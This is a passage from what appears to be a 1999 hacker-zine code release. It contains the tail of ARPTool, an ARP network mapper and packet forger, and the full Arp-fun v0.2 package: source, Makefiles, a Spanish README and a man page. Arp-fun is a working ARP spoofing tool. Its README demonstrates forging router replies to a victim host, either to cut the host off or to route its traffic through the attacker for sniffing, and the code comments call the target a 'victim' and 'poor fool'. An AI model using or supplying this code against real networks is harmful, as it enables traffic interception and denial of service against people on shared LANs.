        unsigned long int ip, ip_s;
        struct pkt_struct * pkt;
        int i;

        ip_s = start_ip;
        ip = ip_s & netmask;

        i = fcntl(fd,F_GETFL);
        if ((fcntl(fd,F_SETFL, i | O_NONBLOCK))<0) {
                perror("FCNTL"); exit (1);
        }

        pkt = (struct pkt_struct *) malloc(sizeof(struct pkt_struct));
        bzero(pkt,sizeof(struct pkt_struct));

        printf(" - Mapping network... \n");
        while (ip < broadcast) {
                unsigned long int iptmp;
                unsigned char hwa[ETH_ALEN];
                ip = ntohl(ip);
                ip = htonl(++ip);

                sendarp(fd,hwaddr,str_to_hwaddr("FF:FF:FF:FF:FF:FF"),hwaddr,0,ip_s,ip,ARP_REQUEST);
                usleep(1000);

                i = sizeof(sock);
                bzero(pkt,sizeof(struct pkt_struct));
                if ((recvfrom(fd,pkt,sizeof(struct pkt_struct),0,&sock,&i)) < 0) continue;

                memcpy(&iptmp,pkt->arp_ip_dst,4);
                if ((iptmp!=ip_s) || (ntohs(pkt->arp_oper)!=ARP_REPLY)) continue;               
                memcpy(&iptmp,pkt->arp_ip_src,4);
                add_to_list(iptmp,pkt->eth_src);
        } 
        show_list();
        free (pkt);
} 
        

void main (int argc, char ** argv) { 
        struct ifreq ifr;
        struct sockaddr_in sin;
        struct spoof_struct sp;
        unsigned long int ip;
        int fd, ret;
        int i = 0, map = 0, spoof = 0, interval = 0;
        char * dev;

        // Parsing the arguments.
        if (argc < 2) { usage(argv[0],0); exit(1); }
        
        usage(argv[0],1);
        dev = (char *) malloc(6); strncpy(dev,"eth0",5);
        while ((i = getopt(argc, argv, "dc:vmi:s:")) != EOF) { 
                switch (i) {
                        case 'm': map = 1; continue;
                        case 'v': verbose = 1; continue;
                        case 'i': dev = optarg; continue;
                        case 'c': interval = atoi(optarg); continue;
                        case 's': spoof = optind-1; continue;
                        case '?': exit(1);
                        default: usage(argv[0],0); exit;
                }
        }
        if ((map) && (spoof)) {
                printf(" Error: cannot run in map mode (-m) and spoof mode (-s) simultaneously.\n");
                exit(1);
        }
        if ((!map) && (!spoof)) {
                printf(" Error: map mode (-m) or spoof mode (-s) must be specified.\n");
                exit(1);
        }
        if (spoof) { 
                unsigned long int ips;
                int origspoof = spoof;

                spoof = optind;
                if ((!argv[origspoof]) || (!argv[spoof]) || (!argv[spoof+1]) || (!argv[spoof+2]) || (!argv[spoof+3])) {
                        printf(" Error: spoof (-s) requires five arguments: \n");
                        exit(1);
                }

                ips = atoi(argv[spoof+3]);
                if ( (ips!=1) && (ips!=2) ) {
                        printf(" Erro: wrong arp operation.  Must be 1 for request or 2 for reply. \n");
                        exit(1);
                } 
                memcpy(&sp.hw_src,str_to_hwaddr(argv[origspoof]),ETH_ALEN);
                memcpy(&sp.hw_dst,str_to_hwaddr(argv[spoof++]),ETH_ALEN);               
                ips= inet_addr(argv[spoof++]);
                memcpy(&sp.ip_src,&ips,4);
                ips = inet_addr(argv[spoof++]);
                memcpy(&sp.ip_dst,&ips,4);
                ips = atoi(argv[spoof]);
                memcpy(&sp.op,&ips,1);
        }


        // Setting up the sockets, interface, and getting data.
        strcpy(sock.sa_data,dev);
        sock.sa_family = AF_INET;
        fd = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP));
        if (fd==-1) {
                perror("Socket: "); exit (1);
        }

        // HW Addr.
        strcpy(ifr.ifr_name,dev);
        ret = ioctl(fd,SIOCGIFHWADDR,&ifr);
        if (ret==-1) {
                perror("Error getting HW Address"); exit (1);
        }
        memcpy(hwaddr,ifr.ifr_hwaddr.sa_data,ETH_ALEN);

        // IP.
        ret = ioctl(fd,SIOCGIFADDR,&ifr);
        if (ret==-1) {
                perror("Error getting IP Address"); exit (1);
        }
        memcpy(&sin,&ifr.ifr_addr,sizeof(struct sockaddr_in)); 
        ip = sin.sin_addr.s_addr;

        // Netmask.
        ret = ioctl(fd,SIOCGIFNETMASK,&ifr);
        if (ret==-1) {
                perror("Error getting netmask"); exit (1);
        }
        memcpy(&sin,&ifr.ifr_netmask,sizeof(struct sockaddr_in)); 
        netmask = sin.sin_addr.s_addr;
//      netmask = 16777215;             // 24 bit Netmask 

        // Broadcast.
        ret = ioctl(fd,SIOCGIFBRDADDR,&ifr);
        if (ret==-1) {
                perror("Error getting broadcast"); exit (1);
        }
        memcpy(&sin,&ifr.ifr_broadaddr,sizeof(struct sockaddr_in)); 
        broadcast = sin.sin_addr.s_addr;

        printf(" - Hardware addr : %s\n",hwaddr_to_str(hwaddr));
        printf(" - Interface IP: %s (%s)\n",inet_ntoa(ip),dev);
        printf(" - Netmask: %s\n",inet_ntoa(netmask));
        printf(" - Brodcast: %s\n",inet_ntoa(broadcast));

        while (1) {
                if (map) netmap (fd,ip);
                if (spoof) {
                        sendarp(fd,sp.hw_src,sp.hw_dst,sp.hw_src,sp.hw_dst,sp.ip_src,sp.ip_dst,sp.op);
                }
                if (interval) sleep(interval);
                        else break;
        }
}


char * hwaddr_to_str (unsigned char * str) {
        static char tmp[20];
        sprintf(tmp,"%02X:%02X:%02X:%02X:%02X:%02X",str[0],str[1],str[2],str[3],str[4],str[5]);
        return tmp;
}

unsigned int hexstr_to_int(char *cptr) {
      unsigned int i, j = 0;
        
      while (cptr && *cptr && isxdigit(*cptr)) {
            i = *cptr++ - '0';
            if (9 < i) i -= 7;
            j <<= 4;
            j |= (i & 0x0f);
      } 
      return(j);
}       

unsigned char * str_to_hwaddr (char * str) {
        unsigned char tmp[2], strbuf[17], t[2];
        static unsigned char * buf, * tt;
        int e, i;

        buf = (unsigned char *) malloc(6);
        bzero(t,2); bzero(tmp,2); bzero(strbuf,17); bzero(buf,6);
        strncpy(strbuf,str,17); strbuf[17]='\0';
        tt = buf;
        
        e = 0;
        for (i=0; i < strlen(strbuf); i++) {
                if ((strbuf[i]==':') && (e==0)) continue;
                tmp[e] = strbuf[i]; e++;
                if (e==2) {
                        unsigned int a;
                        a = hexstr_to_int(tmp);
                        memcpy(tt,&a,1); tt++;
                        bzero(tmp,2); e = 0;
                }
        }
        return buf;
}

void usage (char * av, int mode) {
        printf(" ARPTool v0.1, (c) Cristiano Lincoln Mattos, 1999.  <lincoln@hotlink.com.br> \n");
        if (!mode) {
                printf(" Sintax: %s [-i interface] [-m] [-c] [-s hwsrc hwdest ipsrc ipdst op]\n",av);
                printf("         -i interface: use this interface.  If ommited, default to eth0\n");
                printf("         -m: network map mode.  Will identify all hosts on the same \n                  cable segment. \n");
                printf("         -s src_hwaddress dst_hwaddress src_ipaddress dst_ipaddress operation:\n");
                printf("            send arbitrary ARP packets.  The hardware address must be \n                specified in the usual form, i.e. 00:00:FD:FF:1E:C1.\n                  Operation is 1 for ARP request, 2 for ARP reply. \n");
                printf("         -c interval: continuous mode.  Will keep sending the specified \n              packets every interval seconds (requires -s or -m).\n");
                exit(1);
        }
}       


void show_list () {
        struct list_struct * tmp, * tmp2;
        tmp = head;
        while (tmp!=NULL) {
                struct iplist_struct * iptmp;
                iptmp = tmp->iplist;
                printf(" -- HW Address: %s",hwaddr_to_str(tmp->hw));
                if (iptmp->next) printf(" - Several IP's: probably router with proxy arp, or virtual interfaces.\n");
                while (iptmp!=NULL) {
                        printf("            IP: %s\n",inet_ntoa(iptmp->ip));
                        iptmp = iptmp->next;
                }
                free(iptmp); tmp2 = tmp->next;
                free(tmp); tmp = tmp2;
        } 
        return;
}
              

void add_to_list (unsigned long int ip, unsigned char * hw) {
        struct list_struct * tmp;
        struct iplist_struct * iptmp;
        tmp = head;
        while (tmp) {
                if ((hw[0]==tmp->hw[0]) && (hw[1]==tmp->hw[1]) && (hw[2]==tmp->hw[2]) && (hw[3]==tmp->hw[3]) &&\
                        (hw[4]==tmp->hw[4]) && (hw[5]==tmp->hw[5])) break;
                tmp = tmp->next;
        }
        if (!tmp) {                     // If it's the first HW entry, or did not find HW in list, create
                if ((tmp = (struct list_struct *) malloc(sizeof(struct list_struct))) == NULL) {
                        printf("\n malloc error. \n"); exit (1);
                }
                if ((iptmp = (struct iplist_struct *) malloc(sizeof(struct iplist_struct))) == NULL) {
                        printf("\n malloc error. \n"); exit (1);
                }
                iptmp->ip = ip;
                iptmp->next = NULL;
                tmp->iplist = iptmp;            
                tmp->lastip = iptmp;
                tmp->next = NULL;
                memcpy(tmp->hw,hw,ETH_ALEN);
                if (tail) {
                        tail->next = tmp;
                        tail = tmp;
                } 
        } else {                        // Found the HW entry in the list, just add the IP.
                if ((iptmp = (struct iplist_struct *) malloc(sizeof(struct iplist_struct))) == NULL) {
                        printf("\n malloc error. \n"); exit (1);
                }
                iptmp->ip = ip;
                iptmp->next = NULL;
                tmp->lastip->next = iptmp;
                tmp->lastip = iptmp;
        }
        if (!head) head = tail = tmp; 
}


<-->

Arp-fun v0.2

<++> arp-fun/CHANGES !113c5647

0.2  -- 20/09/1999
- Got it, automatic remote mac resolution. Found get_mac.c in libnet's
  sources.
- I'm a bit confused at the moment, the main goals are reached, now it
  only can get better.

0.15 -- 19/09/1999
- Included Libnet-0.99g and libpcap-0.4 in the tarball
- Got about 20 new compilation errors, but it works !!!
- Code is getting a little bit too crappy, think i'll fix things up for
  0.16

0.14 -- 17/09/1999
- Added a new function: ipaddr_to_str (unsigned char * str);
- Cleaned up cap.c 
- Added references to libnet / libpcap (README)

0.13 -- 16/09/1999
- Started working on remote mac resolution (pcap)
- Code got a little bit clearer; 3 source files and 1 header file
- Code got much uglier: many redundant functions.

0.12 -- 14/09/1999
- Little bit of code cleanup. 2 source files.

0.11 -- 13/09/1999
- Added UID check 
- Added automatic Interface selection

0.1  -- 13/09/1999
- First non public release \
Primera distribucion no-publica (no mucho al menos )

<-->

<++> arp-fun/COPYING !ea18d873

    Arp Fun
    Copyright (c) 1999 ulandron    <ulandron@undersec.com>
    http://www.undersec.com/        

All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions
are met:

1. Redistributions of source code must retain the above copyright
   notice, this list of conditions and the following disclaimer.
2. Redistributions in binary form must reproduce the above copyright
   notice, this list of conditions and the following disclaimer in the
   documentation and/or other materials provided with the distribution.

THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
SUCH DAMAGE.


EOF

<-->

<++> arp-fun/Makefile !6460edb6
all: arp-fun

arp-fun:
	(cd src; make)
clean:
	(cd src; make clean)
install:
	(cd src; make install)
<-->

<++> arp-fun/README !f3d6f19b

Arp Fun                                                     (c) ulandron

1999
-------

	1 - Introduccion
	2 - Funcionamiento
	3 - Instalacion
		
			Requiere:
				Libnet 0.99g
			http://www.packetfactory.net/libnet/
				Libpcap 0.4
			ftp://ftp.ee.lbl.gov/libpcap.tar.Z		

					Compiled: Linux 2.3.15
						  Linux 2.2.5-15
						  Linux 2.2.12
						  OpenBSD 2.5	

1. Introduccion

El fin de este programa era consolidar mis conocimientos con las libnet,
(http://www.packetfactory.net/libnet/), juntando un poco de codigo para un
texto que estaba realizando con Posidon. En principio solo tenia que mandar
paquetes con la mac y la ip de la maquina en la que se ejecuta, a un host
X para sobreescribir su cache y asi poder hacerle creer que somos el
router etc etc etc. Pero poco a poco le he ido añadiendo caracteristicas,
ya que esto con las libnet es coser y cantar. Y espero seguir añadiendole
mas y mas.

############################################################################
############################################################################

2. Funcionamiento

El funcionamiento del programa es muy simple. En la linea de comandos le
suministras un minimo de parametros, hasta un maximo de 9 por ahora.
Por ahora solo hay un parametro obligatorio:

-d dest_ip;	Ip a la que van destinados los arp reply que enviamos /
		forjamos.


Luego existen una serie de parametros opcionales:

-m dest_mac;    Direccion mac del host destino. XX:XX:XX:XX:XX:XX. 
		Si se omite el programa intentara obtenerla
		automaticamente. Esto puede fallar por varias razones.
		Si tarda mucho en resolverla habra que especificarla a
		mano. Si le metiera un timeout esto no haria falta.

-i interface;   Se le suministra la interfaz por la que van a salir las
                tramas. Ej: eth0, xl0, ne3....
		Si se omite el programa escogera automaticamente la
		primera interfaz disponible, exceptuando la loopback

-c count;	Numero de paquetes identicos a enviar. Mas abajo se puede
		especificar un intervalo, si se omite se mandaran lo mas 
		rapido posible. Rango valido de 1 a 100.
-s source_ip;	Ip fuente que aparece en el arp reply. Si se omite se
		usara la ip asociada a la tarjeta de red.

-a source_mac;  Esto es un dilemma. En principio deberia asignar la mac
		que se le indica aqui tanto al paquete arp como a la mac
		de origen del ether. Pero, como ya lo indica la
		documentacion de las libnet, esto no funciona en algunos
		sistemas operativos, por lo que habra que parchear el
		kernel, con el parche que incluyen las libnet.

-v		Modo "verbose". Da un poco mas de detalle. Para mas
		detalle compilar con -DDEBUG

-x seconds      Tiempo que transcurre entre el envio de cada paquete.

-V		Version. Imprime la version del programa.

-h		Ayuda. Imprime una ayuda abreviada.

Ejemplos:

Boot:/ # arp-fun -i eth0 -s 192.168.1.1 -a AA:AB:AC:AD:AE:AF \
-d 192.168.1.4 -m 52:54:AB:21:B6:07 -v -c 2

Sending 2 packets
Source ip: Rewter.See
Everything fine, 'til now. Let's build the packet
Looks nice, huh:
00      5452 21ab 07b6 abaa adac afae 0608 0100
10      0008 0406 0200 abaa adac afae a8c0 0101
20      5452 21ab 07b6 0104 c0a8
Sent packet 1, waiting 0 seconds
Sent packet 2, waiting 0 seconds

 Aqui envio 2 paquetes como mi router, a una maquina de mi subred,
 192.168.1.4, enviandole una MAC completamente aleatoria, con lo que
 imediatamente pierde conectividad. Poco interes.

Boot:/ # arp-fun -i eth0 -m 52:54:AB:21:B6:07 -d 192.168.1.4 -s
192.168.1.1 -c 2 -v
Sending 2 packets
Source ip: Rewter.See
Everything fine, 'til now. Let's build the packet
Looks nice, huh:
00      5452 21ab 07b6 03e2 b622 8201 0608 0100
10      0008 0406 0200 03e2 b622 8201 a8c0 0101
20      5452 21ab 07b6 0104 c0a8
Sent packet 1, waiting 0 seconds
Sent packet 2, waiting 0 seconds


En esta ocasion le envio 2 paquetes a la misma maquina de antes,
haciendole creer que yo soy el router. Para ello le envio mi MAC, y la
192.168.1.1, que es del router, pero que ahora tambien me la he asignado
yo mediante un alias a la ethernet (esto solo se hacerlo en linux, alguna
arquitectura mas ?):

Boot:/ # ifconfig eth0:0 192.168.1.1 netmask 255.255.255.0 up
Boot:/ # ifconfig eth0:0
eth0:0    Link encap:10Mbps Ethernet  HWaddr E2:03:22:B6:01:82
          inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0
          TX packets:0 errors:0 dropped:0 overruns:0
          Interrupt:9 Base address:0x6100

Ahora activando el forward en el kernel, y añadiendole una ruta puede
hacer que los paquetes del 192.168.1.4, por ejemplo, pasen por mi. En
redes que no permiten poner la interfaz en modo promiscuo esto es una
buena solucion para capturar el trafico en red. Eso si, llama mucho la
atencion.

Esto tambien es posible con openbsd 2.5, mediante la siguiente opcion:

# ifconfig xl0 alias 192.168.1.1 netmask 255.255.255.255
Le añado una mask de todo 1's porque si no en openbsd da el siguiente
error: ifconfig:SIOCAIFADDR: File exists.

El resto es muy similar a linux, aunque la sintaxis del comando route(8),
por ejemplo, cambia un poco.

Para mas informacion sobre el tema remito al texto que mencione arriba.

############################################################################
############################################################################

3. Instalacion

Requiere solamente la unistd.h, para getopt() y sleep(). Todo
lo demas deberia ser completamente funcional en cualquier plataforma que
soporte libnet.

Lo he compilado en linux (2.3.15) y OpenBSD 2.5 con diversos parches.
Funciona correctamente en ambos.

Deberia compilar sin tener que retocar nada, da errores todavia pero
funciona.

make; make install;

<-->

<++> arp-fun/TODO !0eb04efa

* Good documentation
* Learn how to write clean code
* Perhaps a GUI ? /* Not really... */
* Better Documentation
* General code cleanup
* Network map mode
* Fix those 100 compiling errors /* now 130 */
* Configure script

<-->

<++> arp-fun/bin/.placeholder !aa0bf2cd
.
<-->

<++> arp-fun/src/Makefile !285ee2fd
CFLAGS= -O2 -g
CC=gcc
LIBNET_DEFINES=`libnet-config --defines`
LIBNET_LIBS=`libnet-config --libs`
INSTALL-DIR = /usr/local/bin/
MAN-DIR = /usr/local/man/man1/
INSTALL = install
SOURCES = arp-fun.c trans.c misc.c
OBJECTS = arp-fun.o trans.o misc.o

all: arp-fun move
	@echo "    *** Compilacion finalizada"
	@echo "    Por favor lee el README adjunto"
	@echo " "
move:
	@mv arp-fun ../bin/

arp-fun: all-obj
	gcc $(OBJECTS) -o $@ $(LIBNET_LIBS) -lpcap

install:
	$(INSTALL) -c -m 0755 ../bin/arp-fun $(INSTALL-DIR)
	$(INSTALL) -c -m 0644 arp-fun.1 $(MAN-DIR)
clean:
	rm -f arp-fun *.o *~
all-obj:
	gcc $(LIBNET_DEFINES) $(CFLAGS) -c $(SOURCES)
<-->
<++> arp-fun/src/arp-fun.1 !3cea2439

.\" This definition swiped from the gcc(1) man page
.de Sp
.if n .sp
.if t .sp 0.4
..
.TH ARP-FUN 1
.SH NAME
.B Arp Fun
\- Libnet Tool for Arp handling 
.SH SYNOPSIS
.B arp-fun -d <dstip> [options]
.SH DESCRIPTION
.B Arp Fun
is aimed at handling various types of arp packets, although at the
moment it can only handle arp replys, enough for the project I was
researching with a friend
.SH OPTIONS
.B Arp Fun
requires at least one command line options:
.Sp
.B \-d
Dest IP.
.Sp
Extra options, not mandatory:
.Sp
.B \-m remote_mac.
Specify if arp-fun is unable to resolve.
.Sp
.B \-i Interface.
Use this interface.
.Sp
.B \-c Count 
Send this many packets.
.Sp
.B \-s Source IP
Spoof an Arp reply from this IP
.Sp
.B \-a Source Mac
Spoof an Arp reply using this MAC
.Sp
.B \-v 
Verbose mode; makes everything a little more verbose. Recommended
.Sp
.B \-x Seconds
Interval to be used between each packet
.Sp
.B \-V
Print out version and exit
.Sp
.SH COMMON USES
Experience will show, hope this helps somebody, I would be glad to hear
your comments.
.SH BUGS 
I'm sure there are lots of them, and there is many room for
improvementent.
.SH AUTHOR
Ulandron
.I <ulandron@undersec.com>
.SH DISTRIBUTION
The newest version of 
.B Arp Fun
can be obtained from 
.I <http://www.undersec.com/members/ulandron/index.shtml>
.Sp
.B Arp Fun
is (C) 1999 by ulandron (ulandron@undersec.com)
This manpage was originally from zhodiac's logit, I am to lazy to build up
a new one from ground up. Thanks man.
.Sp
This program is free software, you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation (Version 2).
.Sp
This program is distributed WITHOUT ANY WARRANTY. See the GNU General
Public License for more details (it is in the COPYING file of the
.B Arp Fun
distribution).

<-->

<++> arp-fun/src/arp-fun.c !f16ce9b8

/* Arp fun, first non-public release. Try to demonstrate how easy
 * it is to play with arp's.
 * 
 * String to Hw addr translation borrowed from:
 *     ARPTool v0.1, (c) Cristiano Lincoln Mattos, 
 *     1999 - <lincoln@hotlink.com.br>
 * 
 * Libnet is grrrrrreat ! thank's route.
 * 
 * Stevens R.I.P., thank's TCP/IP Illustrated I,II,III.
 * 
 * Have lot's of fun !!
 * 
 * (c) 1999 ulandron.
 * 
 */
#include "arp-fun.h"
#include "get_mac.h"

int libnet_do_arp(struct link_int *, u_char *, struct ether_addr *, u_long, char *);
unsigned char *str_to_hwaddr (char *str);
unsigned int hexstr_to_int (char *cptr);

void usage (char *name);

int
main (int argc, char **argv)
{
  int c, nbytes, count = 1, verbose = FALSE;
  u_int secs = 0;
  u_char *pkt, ebuf[BUFSIZ];
  struct sockaddr_in local;
  struct libnet_link_int *link;	/* Our requested IF */
  u_char *dev = NULL;		/* Interface we wanna use */
  u_long dst_ip = 0;		/* Victims ip */
  u_long src_ip = 0;		/* Our ip */
  struct ether_addr *local_mac = NULL;
  struct ether_addr *remote_mac = NULL;
  struct ether_addr e;
   char joder[20];
   
  if (getuid () || geteuid ())
    {
      printf
	("Hmm, I think you need rewt privileges to open a link interface\n");
      exit (1);
    }

  /* Oh my GOD, they killed kenny !!!!! */

  while ((c = getopt (argc, argv, "x:hvVi:c:d:s:m:a:")) != EOF)
    {
      switch (c)
	{
	 case 'V':
	   printf("Arp-fun (c) 1999 ulandron, Version: %s\n", VERSION);
	   exit(0);
	   break;
	 case 'h':
	   usage(argv[0]);
	   break; // Heh
	 case 'x':
	  secs = atoi (optarg);
	  break;
	case 'v':
	  verbose = TRUE;
	  break;
	case 'i':
	  dev = optarg;
	  break;
	case 'c':
	  count = atoi (optarg);
	  break;
	case 'd':
	  dst_ip = libnet_name_resolve (optarg, 0);
	  if (!dst_ip)
	    {
	      perror ("libnet_name_resolve");
	      exit (-1);
	    }
	  break;
	case 's':
	  src_ip = libnet_name_resolve (optarg, 0);
	  if (!src_ip)
	    {
	      perror ("libnet_name_resolve");
	      exit (-1);
	    }
	  break;
	case 'm':
	  remote_mac = (struct ether_addr *) str_to_hwaddr (optarg);
	  break;
	case 'a':
	  local_mac = (struct ether_addr *) str_to_hwaddr (optarg);
	  break;
	default:
	  exit (-1);
	}
    }

  if (count < 1 || count > 100 || (!dst_ip) )// || (remote_mac == NULL))
    {
      usage (argv[0]);
    }
   if (verbose)
     printf ("Attempting to send %d packets\n", count);

  if ((libnet_init_packet (ARP_H + ETH_H, &pkt)) == -1)
    {
      perror ("libnet_init_packet");
      exit (-1);
    }

  if (dev == NULL)
    {
      memset ((char *) &local, 0, sizeof (struct sockaddr_in));
      local.sin_family = AF_INET;
      local.sin_port = htons (0);
      local.sin_addr.s_addr = INADDR_ANY;

      if (
	  (libnet_select_device
	   ((struct sockaddr_in *) &local, (u_char *)&dev, ebuf)) == -1)
	{
	  fprintf (stderr, "libnet_select_device:%s\n", ebuf);
	  exit (-1);
	}
    }

  if (
      (link = (struct libnet_link_int *) libnet_open_link_interface (dev,
							      ebuf)) == NULL)
    {
      fprintf (stderr, "libnet_open_link_interface: %s\n", ebuf);
      exit (-1);
    }
#ifdef DEBUG
  printf ("Successfully open: %s\n", dev);
#endif

   /* Can't happen at this moment, still working on this */
   /* Perhaps fork this one ? */
   /* How do I get back the mac ? pipes ? */
   if(remote_mac == NULL){
      c = libnet_do_arp(link,dev, &e, dst_ip, joder);
      if(c == -1){
	 printf("There could be an error getting remote mac, please specify with -m\n");
      }
      remote_mac = (struct ether_addr *) str_to_hwaddr(joder);
   }

   if (!src_ip)
     {
	src_ip = htonl (libnet_get_ipaddr (link, dev, ebuf));
	
#ifdef DEBUG
	printf ("Source ip got from %s: %s\n",
		dev, libnet_host_lookup (src_ip, 0));
#endif
	if (!src_ip)
	  {
	     fprintf (stderr, "libnet_get_ipaddr: %s\n", ebuf);
	     exit (-1);
	  }
     }
   
   if (verbose)
     printf ("Source ip: %s\n", (libnet_host_lookup (src_ip, 1)));
   
   if (local_mac == NULL)
     {
	
	if (
	    (local_mac =
	     (struct ether_addr *) libnet_get_hwaddr (link, dev, ebuf)) == NULL)
	  {
	     fprintf (stderr, "libnet_get_hwaddr: %s\n", ebuf);
	     exit (-1);
	  }
     }

   printf ("Everything fine, 'til now. Let's build the packet\n");
   
   libnet_build_ethernet (remote_mac, 
			  local_mac, 
			  ETHERTYPE_ARP,	/* Our packet will contain ARP info */
			  NULL,	        /* No extra payload */
			  0, pkt);	/* Allocated mem for packet */
   
   libnet_build_arp (ARPHRD_ETHER,	/* Address format */
		     ETHERTYPE_IP,	/* Protocol format */
		     ETHER_ADDR_LEN,	/* HW len */
		     0x4,	        /* Prot len */
		     ARPOP_REPLY,	/* Op, Arp reply */
		     local_mac,	        /* My HW addr */
		     (u_char *) & src_ip,/* Our IP == Router's IP */
		     remote_mac,	        /* Yer HW */
		     (u_char *) &dst_ip,/* Poor fool */
		     NULL,	        /* Opt payload */
		     0,		        /* sizeof(payload) */
		     pkt + ETH_H);
   if (verbose)
     {
	printf ("Looks nice, huh:");
	libnet_hex_dump (pkt, ETH_H + ARP_H, 0, stdout);
     }
   for (c = 0; c < count; c++)
     {
	
	if ((nbytes = libnet_write_link_layer (link, dev, pkt, ARP_H + ETH_H)) <
	    0)
	  {
	     perror ("write link");
	     exit (-1);
	  }
	
      if (secs)
	  sleep (1);
	
	printf ("Sent packet %d, waiting %d seconds\n", c + 1, secs);
	
     }
   
   if ((libnet_close_link_interface (link)) == -1)
     {
	perror ("close link");
      exit (-1);
     }
   
   libnet_destroy_packet (&pkt);
   if (!verbose)
     printf ("Packet sent, memory freed, link closed; see ya!\n");
   exit (0);
}
<-->

<++> arp-fun/src/arp-fun.h !5cadd602

#include <libnet.h>
#include <unistd.h>
#include <pcap.h>

#define TRUE  1
#define FALSE 0

#define VERSION "v0.2"

#define MAX_CAPSIZ      4096

<-->

<++> arp-fun/src/get_mac.h !89b4dbe5

/*
 *  $Id: get_mac.c,v 1.2 1999/05/05 02:40:22 route Exp $
 *
 *  libnet
 *  get_mac.c - get the MAC address of a remote host
 *
 *  Copyright (c) 1998, 1999 Mike D. Schiffman <mike@infonexus.com>
 *                           route|daemon9 <route@infonexus.com>
 *  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */
#include <libnet.h>
#include <pcap.h>

#define IP_UCHAR_COMP(x, y) \
    (x[0] == y[0] && x[1] == y[1] && x[2] == y[2] && x[3] == y[3])


u_char enet_dst[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

int libnet_do_arp(struct link_int *, u_char *, struct ether_addr *, u_long, char*);

int
libnet_do_arp(struct link_int *l, u_char *device, struct ether_addr *e,
        u_long ip, char *joder)
{
    int n, i;
    u_char *buf, errbuf[256], *packet, *ip_p;
    struct libnet_ethernet_hdr *p;
    struct libnet_arp_hdr *a;
    u_long local_ip;
    pcap_t *pd;
    struct pcap_pkthdr pc_hdr;
   
    /*
     *  Initialize a packet.
     */
    if (libnet_init_packet(ARP_H + ETH_H, &buf) == -1)
    {
        perror("libnet_init_packet memory:");
        exit(EXIT_FAILURE);
    }

    /*
     *  Get the ethernet address of the device.
     */
    e = libnet_get_hwaddr(l, device, errbuf);
    if (e == NULL)
    {
        fprintf(stderr, "libnet_get_hwaddr: %s\n", errbuf);
        return (-1);
    }

    /*
     *  Get the IP address of the device.
     */
    local_ip = htonl(libnet_get_ipaddr(l, device, errbuf));
    if (!local_ip)
    {
        fprintf(stderr, "libnet_get_ipaddr: %s\n", errbuf);
        return (-1);
    }

    /*
     *  Open the pcap device.
     */
    pd = pcap_open_live(device, ARP_H + ETH_H, 1, 500, errbuf);
    if (pd == NULL)
    {
        fprintf(stderr, "pcap_open_live: %s\n", errbuf);
        return (-1);
    }

    /*
     *  Ethernet header
     */
    libnet_build_ethernet(
            enet_dst,               /* broadcast ethernet address */
            e->ether_addr_octet,    /* source ethernet address */
            ETHERTYPE_ARP,          /* this frame holds an ARP packet */
            NULL,                   /* payload */
            0,                      /* payload size */
            buf);                   /* packet header memory */

    /*
     *  ARP header
     */
    libnet_build_arp(
            ARPHRD_ETHER,           /* hardware address type */
            ETHERTYPE_IP,           /* protocol address type */
            ETHER_ADDR_LEN,         /* hardware address length */
            4,                      /* protocol address length */
            ARPOP_REQUEST,          /* packet type - ARP request */
            e->ether_addr_octet,    /* source (local) ethernet address */
            (u_char *)&local_ip,    /* source (local) IP address */
            enet_dst,               /* target's ethernet address (broadcast) */
            (u_char *)&ip,          /* target's IP address */
            NULL,                   /* payload */
            0,                      /* payload size */
            buf + ETH_H);           /* packet header memory */

    n = libnet_write_link_layer(l, device, buf, ARP_H + ETH_H);
    if (n == -1)
    {
        fprintf(stderr, "libnet_write_link_layer choked\n");
        return (-1);
    }
    printf("Sent a %d byte ARP request looking for the MAC of %s.\n",
        n, host_lookup(ip, 0));
    printf("Waiting for a response...\n");

